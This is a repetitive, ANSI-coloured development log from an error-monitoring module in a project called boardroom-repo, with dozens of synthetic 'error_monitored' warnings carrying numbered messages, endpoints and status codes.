WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.888593Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3738'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m538[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.888643Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3739'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m539[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.888694Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3740'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m540[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.888743Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3741'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m541[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.888792Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3742'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m542[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.888841Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3743'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m543[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.888890Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3744'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m544[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.888939Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3745'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m545[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.889037Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3746'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m546[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.889109Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3747'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m547[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.889165Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3748'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m548[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.889217Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m75[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3749'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m549[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.889269Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3750'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m550[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.889327Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3751'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m551[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.889379Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3752'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m552[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.889430Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3753'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m553[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.889479Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3754'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m554[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.889528Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3755'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m555[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.889577Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3756'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m556[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.889627Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3757'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m557[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.889675Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3758'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m558[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.889725Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3759'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m559[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.889775Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3760'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m560[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.889824Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3761'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m561[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.889875Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3762'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m562[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.889930Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3763'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m563[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.889979Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3764'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m564[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.890027Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3765'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m565[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.890075Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3766'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m566[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.890123Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3767'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m567[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.890172Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3768'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m568[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.890266Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3769'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m569[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.890373Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3770'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m570[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.890455Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3771'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m571[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.890516Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3772'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m572[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.890569Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3773'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m573[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.890624Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3774'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m574[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.890674Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3775'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m575[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.890724Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3776'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m576[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.890772Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3777'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m577[0m
